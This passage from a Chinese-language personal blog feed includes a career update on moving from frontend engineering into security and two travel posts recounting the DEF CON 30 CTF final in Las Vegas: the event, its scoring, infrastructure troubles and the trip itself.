月的時候加入了一個國際戰隊叫做 Water Paddler，裡面有來自世界各地的好手，也跟著他們打了一些重大的賽事，像是 PlaidCTF 或是 GoogleCTF 之類的，以及最重要的 DEF CON CTF，也順利打進了決賽，去了拉斯維加斯一趟，心得可參考：<a href="/2022/08/16/def-con-30-ctf-final-1-79220bba7f02/">DEF CON 30 CTF final 遊記（上）</a></p><p>以前一直聽說 DEF CON CTF 是 CTF 的最高殿堂，我就自動腦補成像是 IOI 或是 ICPC World Finals 之於打資訊競賽的人那樣。直到打了今年的 DEF CON CTF 以後，對它的想像有點破滅，理想很美好，現實很…tick 196。希望今年只是意外，明年會更好。</p><p>一個人打跟一群人打的感覺差滿多的，主要是會更有動力一點，例如說以前可能卡住就放棄，因為解出來也無關緊要，現在因為隊裡每個角色都有，所以解出一題就可能影響名次，變得更重要了。</p><p>再者，因為有隊友一起解，所以也可以一起討論或是一起卡關（？），就不會這麼容易放棄，而是會想要把它解開。不過伴隨而來的就是花更多時間在上面了，很多時候週末兩天就完全耗在 CTF 上面，所以我其實滿喜歡 24 小時的 CTF，因為可以留給我一天假日。</p><p>在 CTF 裡面也鍛鍊了不少技能，學到很多奇怪的知識。雖然說有些 CTF 中學到的東西在現實生活中打滲透測試時沒什麼幫助，因為要嘛觸發條件很複雜，要嘛攻擊手法比較不切實際，但我自己認為還是滿有趣的。</p><p>這連帶也影響到我的部落格中與 JavaScript 或是網頁相關的內容幾乎都停止更新了，取而代之的是一堆 CTF 的心得文章跟各種奇怪的知識。</p><p><img src="/img/2022-updates-e2a3ae1c9a2e/1__2VkUOoaZY9F0f63nW8dR7Q.png"></p><p>但我認為有時候真的重要的反而不是那個洞，而是你找洞的過程。例如說有些洞你一定要去看原始碼才能找到，就間接培養了看原始碼的能力。像現在如果有些題目卡住，真的沒其他線索的話，我都會盡可能去找一下原始碼來看，看能不能找到一些蛛絲馬跡。</p><p>話說我在 Web 題中最有興趣的就是我的老本行了，與前端相關的，像是 XSS 或是 XSLeaks 相關的題目，都是我會花很多心力去解的題目。在這個領域的收穫很多，從另外一個角度認識了原本自以為熟悉的東西，真的可以看到很多不同的地方。</p><p>另外，被我認為的這領域的高手們追蹤成為了我的生活小確幸之一，會覺得自己好像又往前邁進了一步。若是想要再往前邁進一步的話，就是要能夠解出他們所出的難題，這個真的難。</p><h3 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h3><p>對自己轉職後這一年間的表現，大概打個 80 分，滲透測試也做了，bug bounty 也打了，找一些真實世界的漏洞也找了，CTF 也打出不錯的成績。</p><p>不過說實在的，似乎可以再更好一點，例如說找到一個比較多人使用的套件或軟體的洞，或是比較複雜、需要串來串去的洞，又或者是比較知名的網站的 bug bounty 之類的。</p><p>總覺得有點不上不下的，你要說表現得不好也沒有到不好，但要說表現得超好，也沒有到那種程度。</p><p>有些人會問我，是怎麼從前端工程師跨到資安領域去的，需要學習什麼額外的技能嗎？我只能說有很大一部分真的是天時地利人和，是因為我在的部門剛好做的比較多都是網站相關的服務，而網站相關的漏洞我本來就熟悉，所以沒有太多額外的東西需要學，基礎本來就不差，再加上也確實有透過<a href="https://github.com/splitline/How-to-Hack-Websites">一些課程</a>或是 CTF 補足了一些相關知識。</p><p>如果今天我們公司做的是什麼 binary 相關的資安或是防毒軟體之類的，那我可能真的就要從頭開始學了，也很有可能因為技能組不符合而轉不過去。</p><p>而且在資安的領域上，我自己覺得目前也還沒踏出舒適圈，比較多都是停留在自己本來就熟悉的 Web，而且就算是 Web，也還是停在偏網頁前端的地方，那些原本就不熟的還是很不熟。</p><p>再者，資安這領域本來就很大，如果是攻擊的話，還有內網滲透也是很大的一塊，但這一塊我就幾乎是零知識。</p><p>理想狀態的話大概是每樣都要會一點，但某一個領域要鑽得特別深。可能就像是我在網站開發上的技能樹一樣，每個都會一點，但是前端鑽得特別深。</p><p>以上大概就是這一年間的近況，接下來更新一下最近發生的事情（其實原本八九月就把這篇寫完，但一直還沒發，所以現在回頭看也沒有這麼最近了）。</p><h3 id="再次轉換團隊"><a href="#再次轉換團隊" class="headerlink" title="再次轉換團隊"></a>再次轉換團隊</h3><p>在大概五月底的時候，我就跟公司提了我八月底要離職。就像以前我待過的每間公司一樣，要離職的話都會盡量提早，讓他們有多點時間能夠找人。當時提離職的原因，是因為我想去 D 社，一間專門做攻擊的頂尖公司。如果 D 社進不去，那我可能就會回去寫前端，然後找國外的工作。</p><p>會做這個決定，是因為我覺得比起當時的工作內容，我更喜歡專心做研究跟攻擊，而且既然都決定要這樣做了，就要去我覺得頂尖的公司，想去看看那邊的風景有什麼不同。而第二順位是想去日本工作，以我的資歷來說要去日本工作，找前端相關職缺的機會是最大的，所以才會說要跑回去寫前端。</p><p>後來也有跟 D 社稍微聊了一下，得到了許多回饋，也知道自己哪些技能還要補足，才能滿足入社的門檻（例如說考個 OSCP 之類的，補一些基礎技能跟內網滲透的東西）。原本是想照著這個學習路徑去補技能，但公司內部有另一個團隊對我有興趣，想跟我聊聊看。</p><p>原本我其實是沒什麼興趣的，因為那邊做的雖然也是資安，但並不是那種純粹攻擊的，而且面向差滿多的，但陸續聊了幾次以後，我開始覺得這是一個滿有趣的機會。</p><p>先講一下那個團隊是做什麼的，簡單來說就是做加密貨幣相關公司的保險，例如說交易所的保險。所以以我來說，平常的工作內容大概就是要去看每個客戶的系統架構以及針對錢包的解決方案，有沒有哪些技術上的問題，看一下在技術這一端的風險為何。</p><p>除此之外，也需要去研究一些技術相關的議題，並且在內部分享讓其他成員聽懂，例如說什麼是 HSM 啦，什麼是 MPC 啦，以及冷熱錢包的差異等等。</p><p>在保險知識上面也需要略懂略懂，因為風險可能會與保險的種類有關，例如說你保的是 A，就沒有涵蓋到 B 類型的風險，就可以整個不看。</p><p>雖然我打從一開始進的就是 OneDegree 這間保險公司，但在保險方面的知識其實沒有增加太多，充其量就是對不少專有名詞以及理賠的細節有更多認識，反倒是進去了這個 team 以後，才開始慢慢瞭解保險真正的核心。</p><p>除了保險以外，畢竟是與 web3 相關的研究，所以也會接觸到 smart contract 相關的東西，也有在看一些智慧合約相關的風險以及資安問題。</p><p>最後呢，在認真考慮了一週以及找了幾個同事聊聊之後，我在九月初已經正式轉入這個新成立的團隊：<a href="https://oneinfinity.global/">OneInfinity</a>。</p><p>咦？怎麼前面才說我想去專門做攻擊與研究的公司，到了這邊又不是這麼一回事了？對，因為「<a href="/2020/04/26/i-dont-know-what-i-want-about-career-383bee0be733/">關於求職，連我自己都不知道我要什麼</a>」，我以為我要的是 A，結果聊一聊發現 B 其實也不錯，滿有趣的，也可以是一個選項，我一直以來都是這個樣子的。</p><p>其實我自己也對這個轉換猶豫了一陣子，以興趣來說我覺得是符合的，也覺得可以學到不少新東西，但我擔心的是：「這樣是不是把職涯走歪了？」，換個方式問：「如果我離開這邊，我下一份工作該找什麼？」</p><p>前端的話，應該機會比較大，但可能已經一兩年沒寫了；資安的話，也才轉職一年，沒有什麼太大的成果。轉到這個新團隊以後，我自己覺得我的職涯就有了斷層。</p><p>但往好處想的話，可能就是證明了自己是那種「有能力解決問題」的人，前端也好，資安也好，保險或是做系統的技術評估也好，無論是什麼領域，反正球來就打，我都能做好。</p><p>不過，也要未來的公司懂得欣賞而且需要這種能力就是了，畢竟有的職位就是要找「某一項技能專精就好」，有的則是要找「有能力解決問題」的人。當然，如果能兩種加在一起是最好的。</p><p>總之呢，我後來還是選擇換團隊了，也就代表這些職涯規劃的東西我暫時沒那麼在乎，反正還年輕，跟著當時的興趣走就好了。就算未來想回前端或是資安，重新再磨練就是了。而且我本來就對自己的職涯沒有什麼明確規劃，一直都是抱持著且戰且走的心態，沒有想這麼多。</p><p>我沒有不喜歡前端，也沒有不喜歡資安，我到現在還是每個月至少會打一場 CTF，你看我上面貼的部落格截圖就知道了，也還是會關注前端的話題，關注各種社群。我不是那種「我終身的志向就是要做 ____」的人，我是隨著自己興趣所浮動的人，我是能在各種領域都能找到樂趣並投入的人，但儘管如此，我依然有著能把當前的工作內容做好的自信。</p><p>以上就是近況更新，大概就是轉換跑道到資安的這一年間做的東西，以及又換了一個新團隊的消息，或許半年或一年後，再來更新一下近況吧。</p>]]></content>
      
      
      <categories>
          
          <category> 職涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DEF CON 30 CTF final 遊記（下）</title>
      <link href="/2022/08/17/def-con-30-ctf-final-3-e19eeeed8e44/"/>
      <url>/2022/08/17/def-con-30-ctf-final-3-e19eeeed8e44/</url>
      
        <content type="html"><![CDATA[<p>第一篇寫台北飛美國心得，第二篇寫 DEF CON &amp; CTF 心得，第三篇就來隨意寫一下其他的心得。</p><h3 id="After-Party"><a href="#After-Party" class="headerlink" title="After Party"></a>After Party</h3><p>前面有提過最後一天的比賽只到下午兩點而已，而最近幾年好像有些隊伍都會自動出來辦一個 after party，讓選手們互相交流認識一下，地點在威尼斯人的總統套房，我因為好奇去參觀了一下，真的猛：</p><p><img src="/img/def-con-30-ctf-final-3-e19eeeed8e44/1__7DAcyTaPn__6rtLlQODCiSQ.jpeg"><br><img src="/img/def-con-30-ctf-final-3-e19eeeed8e44/1__NHAo00BmJAgrD5XFb2Emtg.jpeg"><br><img src="/img/def-con-30-ctf-final-3-e19eeeed8e44/1__LxH3RyoMSoi__0mKG0QXMAQ.jpeg"></p><p>房間裡面還有一台鋼琴，不過我沒拍就是了。</p><p>趴踢實際的樣子可以參考主辦人之一的推特：<a href="https://twitter.com/gf_256/status/1559249419991560193">https://twitter.com/gf_256&#x2F;status&#x2F;1559249419991560193</a></p><h3 id="賭博"><a href="#賭博" class="headerlink" title="賭博"></a>賭博</h3><p>既然都到了 vegas，當然是要小賭一下，我這次只玩了兩種：</p><ol><li>21 點</li><li>轉盤</li></ol><p>21 點的話就運氣運氣的，我是跟機器玩的不是跟真人玩，只要把紙鈔投進去就會自動換成籌碼，每一輪有幾個選擇：</p><ol><li>split（分牌，要兩張牌同個點數才能分）</li><li>double down（再要一張並加倍賭注）</li><li>stand（不要了）</li><li>hit（再要一張）</li></ol><p>然後都會有一個 minimum bet，基本上很多都是 5 塊錢，最小賭注就是 5 塊。然後當莊家開場其中一張是 A 的時候，機器會問你要不要買保險，例如說我賭 5 塊錢，保險就是 2.5 塊，似乎當莊家 21 點的時候可以賠少一點。</p><p>總之呢，我都拿 20 塊下去賭，賭到變成 50 就 cash out，機器就會吐一張紙給你，你再拿那張紙去跟櫃檯換真的錢。我第一次換錢的時候什麼都沒看就給我，第二次換的時候說要看護照。</p><p>在這邊我成功把三張 20 塊變成三張 50 塊 🎉</p><p>原本在想要不要跟真人玩，但真人的話最小賭注基本上都是 15 塊起跳，先算了。</p><p>之後跟朋友去其他賭場走走，在另外一間玩了轉盤（Roulette），策略很簡單，就是「明明是獨立機率卻不信邪」，例如說前面四次都開紅色，下一次就押黑色之類的。</p><p>靠著這個錯覺策略，在出現四次黑色時壓了紅色，輸 50，下一局再壓紅色，又輸 50，接著再壓，又輸 50，幸好還有錢，下一局直接壓 100 紅色，把之前輸的贏了一些回來，然後再隨便下個幾盤。</p><p>最後的結果是在轉盤這邊似乎沒輸沒贏。</p><p>朋友則是靠著他的充電線不小心壓到螢幕的下注小賺了 25 塊，然後就趕快 cash out 了。</p><h3 id="天氣"><a href="#天氣" class="headerlink" title="天氣"></a>天氣</h3><p>拉斯維加斯的天氣其實比我想得好，待的這幾天中有一兩天是陰天，甚至還有一天晚上是下大雨。我記得第二天中午出門的時候真的滿熱的，但晚上其實就滿 ok，有些陰天的時候白天出門也滿 ok，不會覺得特別熱。</p><h3 id="食物"><a href="#食物" class="headerlink" title="食物"></a>食物</h3><p>這次有吃一些速食（麥當勞）跟一些餐廳，速食就沒什麼好特別講的，份量跟台灣差不多，而餐廳的話值得一提，有不少餐廳的份量真的都滿大份的，光是點一個義大利麵就可以吃不完。</p><p>然後也不是每天都吃美式食物，有吃一些義式料理之類的，比想像中好吃滿多的，覺得有點驚艷。</p><p>還有去吃一間滿特別的吃到飽的餐廳，跟台灣的差滿多的，buffet 的部分都是一些沙拉跟水果，肉的部分是會有很多不同的人拿著一串肉到你桌上，問你要不要，要的話就切一塊下來到你盤子上。肉的種類超多，吃一輪大概就飽了。</p><h3 id="回台灣"><a href="#回台灣" class="headerlink" title="回台灣"></a>回台灣</h3><p>我回台灣的行程一樣也有點特別：</p><ol><li>AA LAS -&gt; LAX</li><li>AA 班號 JL 執飛 LAX -&gt; HND (+1)</li><li>JL HND -&gt; TSA(+2)</li></ol><p>飛到日本以後因為當天沒有其他 JL 班機回台灣，所以需要在機場過夜。對，這就是為什麼我今天可以把三篇心得都寫完，因為這時候是日本時間晚上 10:56 分，而我在日航貴賓室寫著心得。</p><p>在 LAS check in 的時候地勤跟我說我的行李掛不到台北，只能掛到日本，於是跟我說幫我掛到 LAX，我在洛杉磯再去求救。我問他說能不能直接掛到日本，我去日本再求救，因為我從 LA 飛日本的班機比較趕一點。</p><p>但他說時間很充足，去洛杉磯求救比較好，就照著他說的做了。</p><p>幸好飛到洛杉磯的班機不但沒有 delay，還提早到了 10 分鐘，拿完行李以後我去 AA 櫃檯說明狀況，他說要去 JL 櫃檯掛，跑去 JL 櫃檯發現沒什麼人，很快就把我的行李處理好了，然後印了兩張新的日航登機證。</p><p>安檢也沒有太多人，於是成功在時間充裕的狀況下進到管制區，還可以去貴賓室待個半小時左右，時間真的是滿夠的。</p><p>這次從 LAX 飛 HND 的飛機就是我原本買的豪華經濟艙了，長這樣：</p><p><img src="/img/def-con-30-ctf-final-3-e19eeeed8e44/1__umJxNiKhtlPmISwp2yxMUw.jpeg"><br><img src="/img/def-con-30-ctf-final-3-e19eeeed8e44/1__AC0xtv4crOOVEe4eoGGGlA.jpeg"></p><p>實際體驗覺得比經濟艙舒服一些，至少腳不會頂到前面椅子，其他倒是沒有差太多，然後豪經也幾乎快賣完了，看起來只剩下三四個位子之類的。</p><p>因為 10 個小時的飛行時間實在太久，所以在機上看了沙丘跟奇異博士 2，最後還看了一半的玩命關頭 9，下次要飛長途的話，如果票價沒有貴真的很多，應該還是會選擇豪華經濟艙，比較舒適一點。</p><p>到日本以後跟之前一樣，轉機的先留著再一起帶到機場去。</p><p>下飛機以後一樣去了機場貴賓室，它的開放時間會根據當日的班機而定，我那天是凌晨 1:25 才關（因為最後一班日航班機是這個時間點），於是我就在那邊待到差不多 1 點左右，然後我東看西看都沒看到洗澡間，猜測可能是因為疫情暫時關閉了。</p><p>從貴賓室出來以後，在機場中尋找安身之所，找滿久才找到一個相對滿意的地方，不會太吵，附近也沒什麼人，就在椅子上面躺了睡覺。說實在的，還真的滿難睡的，根本睡不太著，我大概只能勉強睡個兩小時，然後再爬起來去別區睡一下，這樣醒醒睡睡大概就到了早上五點，開始滑手機到六點貴賓室開門，再進去吃個早餐。</p><p>前往台北的飛機人比想像中多一點，而且也比較大台，光商務艙好像就有個八排，在機上因為真的很想睡，所以除了吃飯的時間以外都在睡覺。</p><p>到松山機場之後，因為座位在滿前面的（20 排，商務艙最後一排是 8，經濟艙第一排是 18），所以很早下飛機，下飛機以後就開始闖關。</p><p>松山跟桃園機場的關卡不太一樣，這邊拿完快篩跟 PCR 檢體罐以後，是先去做唾液 PCR，做完之後才入境拿行李，桃園機場是相反，拿完行李以後才去 PCR。</p><p>而且桃園機場的 PCR 在戶外，松山機場的在室內，感覺比較高級一點。</p><p>總之呢，因為我東西都有先準備好，所以很快就過關了，大概是前三個跑完流程的。</p><p>拿完行李以後就去搭防疫計程車，因為是前幾個出來的所以也不用什麼等待時間，看了看機場的入境清單，似乎同時間就只能這一台班機而已。</p><p>其他流程就跟桃園機場差不多了，搭防疫計程車抵達要隔離的地方，話說車錢比我想的便宜，大概 300 塊而已（我原本預期個 500 之類的）。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>幫系列文做個總結。</p><p>美國的話，跟上次去的心得感想一樣，沒有特別愛。如果要飛這麼遠的話，我會選擇去歐洲而不是去美國。不過如果是旅遊的話，先不考慮疫情，日韓還是首選就是了。</p><p>拉斯維加斯的話，其實我覺得如果是在主要市區玩的話，似乎不會特別想要去第二次，就是覺得那邊建築都很猛，看個新鮮感。畢竟美國這麼遠，不會為了這個想要跑一趟，說實在的去縮小版的澳門也可以有類似的感覺，當然沒有美國正版這麼壯觀，但如果是從沒去過拉斯維加斯也沒去過澳門，其實澳門相對起來 CP 值高滿多的。</p><p>DEF CON 的話，這次沒聽什麼議程，也沒跟太多人聊到。我覺得這種研討會確實跟前人講的一樣，可能最主要的目的是社交，認識一個新朋友以及跟老朋友敘舊之類的。</p><p>如果只是想聽議程的話我記得滿多可能之後都會釋出，上網看其實就可以了，還可以隨時暫停或是放大畫面，體驗會更好，沒什麼必要跑到現場。</p><p>DEF CON CTF final 的話，不知道是不是這次特別慘，或是我期待太高（或是期待的方向錯誤），其實跟我想像中落差滿多的。但畢竟 DEF CON CTF final 被稱作是 CTF 的最高殿堂，我的期待應該也是滿合理的。</p><p>我本來以為會是一個滿正式的比賽？然後弄得滿慎重那樣，不過從壞了三天的 infra 跟各種大小問題，以及可以直接開放自由參觀這點來看，似乎沒我想像中這麼慎重，比起一個很專業很正式的比賽，比較像是更輕鬆一些的活動？</p><p>飛行的話，之前拿的 JGC 真的超值，有張高卡可以進貴賓室真的很讚，轉機時間拉長都覺得無所謂，反正可以去貴賓室吃東西休息。不過拉斯維加斯沒有 OneWorld 貴賓室就是了，小可惜。</p><p>其實之前一直在考慮要不要去 DEF CON，因為說實在的跑一趟其實滿麻煩，例如說要轉機很多次、要飛很遠很久、要調時差、回來要隔離之類的，但後來想說這種機會也不常見，就先去再說吧。</p><p>後見之明覺得這個選擇是正確的，是滿難忘的一次體驗，見到了一直在線上共同打拼的隊友們，也體驗了一次傳說中的 DEF CON CTF final，無論結果本身好或壞，經歷過的過程都是物超所值的。</p>]]></content>
      
      
      <categories>
          
          <category> 旅遊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 旅遊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DEF CON 30 CTF final 遊記（中）</title>
      <link href="/2022/08/16/def-con-30-ctf-final-2-4444cf3645e/"/>
      <url>/2022/08/16/def-con-30-ctf-final-2-4444cf3645e/</url>
      
        <content type="html"><![CDATA[<p>上一篇裡面寫到了從台灣到美國的過程，以及對拉斯維加斯的一些心得，這篇就來寫一下 DEF CON 本身以及 CTF 的一些心得。</p><p>讓我們先來看一下 DEF CON 的會場長什麼樣子：</p><p><img src="/img/def-con-30-ctf-final-2-4444cf3645e/1__ewjEJY747YSAgd__W882Byw.jpeg"></p><p>這是第一天去的時候在門口拍的，就是個很大的會議廳，這只是入口而已，真的議程在其他地方，然後這是今年的 badge：</p><p><img src="/img/def-con-30-ctf-final-2-4444cf3645e/1__HwqbCMCdt4uBqJkWmX6EgQ.jpeg"></p><p>好像是個可以拿來錄音然後做取樣的小玩具，後面要放三顆電池才會動，但因為我聽隊友說如果被金屬碰到一不小心可能會短路然後燒掉（推特上有人講的），所以其實我從頭到尾都沒打開過，到現在也是。</p><p>接著既然來講一下 DEF CON，這邊除了有幾間是給議程以外，其他很多間都是給不同的「Villege」，可以想成是很多不同的主題，例如說 Car Hacking Villege：</p><p><img src="/img/def-con-30-ctf-final-2-4444cf3645e/1__gWK__G3P__DAljuZmuOefcfQ.jpeg"></p><p>就是在探討各種跟汽車相關的攻擊手法，所以你可以看到超多 Villege，例如說有 Physical Hacking 的，甚至還有衛星相關的之類的。而除了我這次參加的 DEF CON CTF 以外，現場還有各種其他的 CTF，可以說是 CTF 遍地開花。</p><p>例如說有一個好像就是社交工程的 CTF，然後現場直接放幾台電話，應該是要你直接現場社交工程XD</p><p>或是有一個聽我隊友說應該是現場弄一個會偷資料的 WiFi 之類的，會把偷來的東西打碼以後直接投影出來：</p><p><img src="/img/def-con-30-ctf-final-2-4444cf3645e/1__hXXoPepFUrVLTh1CmASYHQ.jpeg"></p><p>總之呢，現場可以看到各式各樣的主題，還滿有趣的。不過因為這次主要是來參賽，所以也沒有聽議程，然後會場也只是隨意逛逛看看有什麼而已。</p><p>接著來寫一下這次 CTF 的心得，這次我是跟著 Water Paddler 這個隊伍參賽，而不是台灣聯隊（<a href="mailto:&#66;&#x61;&#x6c;&#x73;&#110;&#46;&#50;&#x31;&#x37;&#x40;&#84;&#83;&#74;&#x2e;&#116;&#119;">&#66;&#x61;&#x6c;&#x73;&#110;&#46;&#50;&#x31;&#x37;&#x40;&#84;&#83;&#74;&#x2e;&#116;&#119;</a>），我們這支隊伍基本上是個國際隊伍，像這次去 on-site 的選手就來自世界各國，跟其他 CTF 隊伍相比，比較像是那種網路上的「公會」那種概念，成員之間彼此都沒見過面，所以這次同時也是網友見面會。。</p><p><img src="/img/def-con-30-ctf-final-2-4444cf3645e/1__SKXIhnbF__om9JtndP__IETg.jpeg"></p><p>實體的場地大概長這樣：</p><p><img src="/img/def-con-30-ctf-final-2-4444cf3645e/1__2sBg1k4z8EPaGKKCEoZNkA.jpeg"></p><p>左邊很亮那個燈那裡是主辦單位坐的地方。</p><p>遠方那些一團一團的人，都圍著一個圓桌，最多坐八個人，一張圓桌就是一個隊伍。所以你可以看到隊伍之間距離是滿近的，大聲討論的話可能會被聽到（我以為會遠一點）</p><p>然後現場會放很吵的音樂，所以大部分選手都有戴耳機來隔絕音樂。另外還有一點很傻眼，就是開賽以後他們把大門打開，開始放人進來參觀…這個超乎我預料以外，我本來以為是個封閉場所，沒想到開放到不行，變成跟動物園一樣，會有很多會眾走進來參觀。</p><p>至於右前方那個桌子則是這次的新賽制：LiveCTF，這個是一對一的電競比賽，參賽選手的畫面會同步到 YouTube 上面，也會有主播跟賽評來講解現在選手的狀況。</p><p>參賽的隊伍總共 16 隊，LiveCTF 每次是一對一，然後是單淘汰賽，不同名次有不同分數：</p><ul><li>第一名：4011 分</li><li>第二名：2674 分</li><li>3~4 名：1337 分</li><li>5~8 名：668 分</li><li>9~16 名：0 分</li></ul><p>而除了 LiveCTF 以外的主賽制的分數計算是每 5 分鐘一輪，在這一輪之內你要做到幾件事情：</p><ol><li>保證自己服務不會壞掉（SLA），壞掉 -30 分</li><li>修補漏洞，保護自己的服務不被打下來（Defense）</li><li>打別的隊伍，拿到他們的 flag（Attack）</li></ol><p>做到會加分，沒做到會扣分。</p><p>服務被打下來，flag 被拿到的話會 -15 分，這 15 分會分配給其他攻擊成功的隊伍，所以一道題目理論上一輪可以拿的最高分數應該是 15*15 &#x3D; 225 分。</p><p>這邊可以看到 LiveCTF 的分數有多誇張，第一名的 4000 分就是你要在主賽事當中打全場打 18 輪，也就是 90 分鐘，在中間完全沒有人可以攻擊以及防禦，才能拿到 4000 分。</p><p>第一天剛開賽就放出兩題，其中一題是 web，所以我們這隊的幾個人就開始看 web，是個 Java 的服務，然後光是看懂資料到底怎麼傳的就花了不少時間。</p><p>然後主辦單位有提供延遲 20 分鐘的網路封包內容，在某個時刻我們從網路封包裡面發現其他隊伍的攻擊流量，因為是明文的所以可以直接抄來用，「抄別人作業」其實在比賽中也滿重要的，你越早抄到，就可以拿越多分。</p><p>而攻擊的隊伍也要想辦法不讓別人抄作業，不然辛苦努力得來的分數都被整碗端去了QQ</p><p>第一天裡面官方的 SLA check 會出一些怪問題，例如說服務明明就沒動它，但是卻說 SLA failed 然後被扣分之類的，總之就是小問題不斷。不過 web 那一題雖然我們到最後還是沒有很清楚到底怎麼攻擊，但就是先把感覺會有問題的地方 patch 掉（要 patch jar 好麻煩…），最後應該是防住了大部分的攻擊。</p><p>總之呢，第一天的比賽是從 11 點到 7 點（表定 10 點到 6 點，但延遲一個小時開始），結束之後主辦單位說中間那些 SLA fail 的東西他們會全部 review 一遍，然後把分數更正。</p><p><img src="/img/def-con-30-ctf-final-2-4444cf3645e/1__E__EbhPIwn9nJfaVrdXFTuA.png"></p><p>第一天結束後，我們隊伍暫居第三名，然後今天的題目第二天都不會出現，所以沒有回家作業。</p><h3 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h3><p>第二天的計分板是主辦單位修過的版本，其中有一個隊伍因為昨天用 fork bomb 所以被扣分，不過儘管如此，名次卻比第一天高了一位XD</p><p>早上有跟台灣聯隊稍微聊一下，也算是個網友見面會，見到了以前有看過部落格文章的 <a href="https://blog.kaibro.tw/">KaiBro</a> 跟 <a href="https://bookgin.tw/">bookgin</a>！</p><p>第二天沒有 web 題，不過我在刷後台的時候看到了一個應該是自動排程釋出的服務：「web4ransom」，就想說下午應該會出這個（結果都沒有出）。</p><p>而第二天也出現了另一種類型的題目：King of the Hill，這次的題目是這樣的，server 那邊會執行 <code>./vm offset file1 file2</code> 然後每個隊伍都可以上傳檔案，每一輪的 offset 會不同，看誰的檔案會贏。</p><p>至於贏的條件是什麼，就要 reverse vm binary 才會知道了。</p><p>計分板長得像這樣：</p><p><img src="/img/def-con-30-ctf-final-2-4444cf3645e/1__8Mwlaa1yF7zfLrJwMyYB0A.png"></p><p>一樣是每五分鐘一輪。</p><p>剛開始的時候大家都是 TIE，接著過一陣子我們發現 Balsn 傳了一個檔案之後直接贏全場，就趕快抄作業拿來用，也跟著贏，接著就有更多隊伍發現，於是沒抄的就變成弱勢了，後來到中場變成大家都抄一樣的檔案，又變回平手XDD</p><p>然後主辦單位的 infra 又開始不穩，有幾輪延遲，然後有幾輪結果是 N&#x2F;A，完全不知道自己到底是贏還輸。</p><p>到後半段的時候則是有隊伍開始慢慢把 vm 逆完了，知道規則是什麼，可以寫出在主場必贏的檔案。</p><p>然後今天的 LiveCTF 我們輸掉了，所以在這部分沒有分數可以拿。</p><p>而這天的其他題目在賽後有說明天會繼續用，這就是寫作業的信號了，今天賽後有很多選手基本上是熬夜沒睡覺在研究那幾題，打算隔天早上大殺四方。</p><p>而我們打 web 的有好理由相信今天看到的 web4random 既然昨天沒出，明天應該會出，所以就準備明天再打一題 web。</p><p>喔對了，今天結束後我們隊伍依然暫居第三。</p><h3 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h3><p>最後一天的比賽只從 10 點比到 2 點，半天而已，總共 4 個小時。</p><p>經過一個晚上的準備，有一兩題我們已經準備好 exploit，準備開始拿分數了，一開賽的時候滿順利的，有一輪甚至直接拿到 +300 分，殊不知接下來就悲劇了。</p><p>還記得我說過一輪是 5 分鐘嗎？接下來每一輪開始慢慢變長，主辦單位說是因為碰到一些問題在修，所以會延長，而其中某一輪甚至維持了快一個小時…</p><p>這就代表原本有 12 輪可以拿分，變成只有 1 輪，對於可以拿分的隊伍來說其實是少了很多分數的。</p><p>而這中間主辦單位也有人跑來說我們其中有一題的 patch 雖然有過 SLA，但是不行（？？？），原因是後台顯示的 SLA 其實只有一半，另外一半是線下做的，要兩個部分都過關才算數。</p><p><img src="/img/def-con-30-ctf-final-2-4444cf3645e/1__br0Zy8C__QBRvWMU3CGxvpQ.png"></p><p>然後可能是因為今天從開賽就很混亂，所以主辦單位表示今天不會有任何新的題目，因此昨天盼望的那題 web 也沒了。</p><p>round delay 的狀況一直沒有解決，scoreboard 遲遲沒有更新，我們選手自己有個非官方的 Discord 群組，我看到裡面已經有人開始揪下棋跟打 Tetris，因為我那時也沒什麼事情做，所以就進去一起玩（拿了幾次第一名，以前玩Facebook tetris battle 的肌肉記憶還存在一部分）。</p><p>結果，玩著玩著到了一點的時候，我隊友突然說比賽結束了！因為主辦單位一直沒有辦法解決 infra 的問題，所以乾脆提早一個小時結束。</p><p><img src="/img/def-con-30-ctf-final-2-4444cf3645e/1__49CvdwgpdkAvNhZl25i67Q.png"></p><p>於是就在我還在打 Tetris 的時候，我的第一次 final 就這樣在混亂中結束了，而比賽也停在了 tick 196，也出現了一堆選手做的迷因：</p><p><img src="/img/def-con-30-ctf-final-2-4444cf3645e/1__gaQy88Ni7DveDDPLDnFIXw.jpeg"><br><img src="/img/def-con-30-ctf-final-2-4444cf3645e/1__XJLXb1dat____ivTZfQn1biw.png"></p><p>其實滿傻眼的，而且很多選手應該覺得滿幹的，昨天熬夜做的作業就這樣化為塵土，賽後可以看到一堆選手在推特上面開噴，人之常情。</p><p>LiveCTF 則是繼續比總決賽，拿了冠軍的隊伍加分之後變成了第三名，我們掉到第四名去，為這次的 final 畫下了句點。</p><p>聽說每年的 DEF CON CTF 都會出一些小問題，但今年似乎是出最多問題或是最嚴重的，第三天真的超級混亂。</p><p>說實在的覺得滿可惜，雖然前兩天問題不斷但也都覺得還 OK，第三天就是真的大爆炸沒辦法救了。只能期待明年 infra 會穩一點，然後繼續努力繼續加油。</p><p>第三篇傳送門：[&#x2F;2022&#x2F;08&#x2F;17&#x2F;def-con-30-ctf-final-3-e19eeeed8e44&#x2F;)</p>]]></content>
      
      
      <categories>
          
          <category> 旅遊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 旅遊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DEF CON 30 CTF final 遊記（上）</title>
      <link href="/2022/08/16/def-con-30-ctf-final-1-79220bba7f02/"/>
      <url>/2022/08/16/def-con-30-ctf-final-1-79220bba7f02/</url>
      
